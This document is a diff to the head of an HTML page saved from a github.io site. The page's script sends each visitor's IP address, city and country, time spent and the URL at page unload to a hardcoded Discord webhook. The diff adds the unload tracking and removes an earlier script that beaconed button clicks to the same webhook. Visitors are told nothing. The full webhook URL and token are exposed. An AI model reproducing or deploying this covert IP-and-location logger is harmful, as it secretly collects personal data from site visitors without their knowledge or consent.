@@ -2,11 +2,11 @@
 <!-- saved from url=(0035)https://smittyssmellyass.github.io/ -->
 <html lang="en-US"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <script>
-  // Function to send the visitor information to Discord
-  function sendToDiscord(ip, method, location) {
-    // Discord webhook URL
-    var webhookUrl = 'https://discord.com/api/webhooks/1108245504875315221/wzMQweJ_oa7jyGPPyJr7iZlPVz9_iDzJN00eLIQJnJLD-2mFnXYxtYY73PS5h0ttTUio';
+  var startTime = new Date(); // Store the start time when the page loads
+  var webhookUrl = 'https://discord.com/api/webhooks/1108245504875315221/wzMQweJ_oa7jyGPPyJr7iZlPVz9_iDzJN00eLIQJnJLD-2mFnXYxtYY73PS5h0ttTUio'; // Discord webhook URL
 
+  // Function to send visitor information to Discord
+  function sendVisitorInfoToDiscord(ip, method, location, timeSpent, siteLeftTo) {
     // Create a new XMLHttpRequest object
     var xhr = new XMLHttpRequest();
 
@@ -18,7 +18,12 @@
 
     // Create the JSON payload with the visitor information
     var payload = {
-      content: ip + ' visited PoschPlus.com' + method + ' at ' + new Date() + ' from ' + location
+      content: 'Visitor information:\n' +
+        'IP: ' + ip + '\n' +
+        'Method: ' + method + '\n' +
+        'Location: ' + location + '\n' +
+        'Time spent: ' + timeSpent + ' seconds\n' +
+        'Left to: ' + siteLeftTo
     };
 
     // Convert the payload to JSON string
@@ -46,11 +51,25 @@
           .then(response => response.json())
           .then(data => {
             var location = data.city + ', ' + data.region + ', ' + data.country_name;
-            sendToDiscord(ip, method, location);
+
+            // Calculate the time spent on the page in seconds
+            var endTime = new Date();
+            var timeSpent = (endTime - startTime) / 1000;
+
+            // Send the initial visitor information to Discord
+            sendVisitorInfoToDiscord(ip, method, location, timeSpent, '');
+
+            // Capture the leaving event to get the site left to
+            window.addEventListener('beforeunload', function(event) {
+              var siteLeftTo = event.currentTarget.location.href;
+
+              // Send the leaving visitor information to Discord
+              sendVisitorInfoToDiscord(ip, method, location, timeSpent, siteLeftTo);
+            });
           })
           .catch(error => {
             console.error(error);
-            sendToDiscord(ip, method, 'unknown location');
+            sendVisitorInfoToDiscord(ip, method, 'unknown location', 0, 'unknown site');
           });
       })
       .catch(error => console.error(error));
@@ -58,33 +77,6 @@
 
   // Call the getVisitorInfo function when the page is loaded
   window.addEventListener('load', getVisitorInfo);
-</script>
-<script>
-  // Function to send button click information to Discord using sendBeacon
-  function sendButtonInfoToDiscord(buttonClicked) {
-    // Discord webhook URL
-    var webhookUrl = 'https://discord.com/api/webhooks/1108245504875315221/wzMQweJ_oa7jyGPPyJr7iZlPVz9_iDzJN00eLIQJnJLD-2mFnXYxtYY73PS5h0ttTUio';
-
-    // Create the JSON payload with the button click information
-    var payload = {
-      content: 'Button clicked: ' + buttonClicked
-    };
-
-    // Convert the payload to JSON string
-    var payloadJson = JSON.stringify(payload);
-
-    // Send the request with the payload using sendBeacon
-    navigator.sendBeacon(webhookUrl, payloadJson);
-  }
-
-  // Add event listeners to track button clicks
-  var buttons = document.querySelectorAll('button');
-  buttons.forEach(button => {
-    button.addEventListener('click', function(event) {
-      var buttonClicked = button.textContent;
-      sendButtonInfoToDiscord(buttonClicked);
-    });
-  });
 </script>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 	 <link rel="profile" href="https://gmpg.org/xfn/11"> 
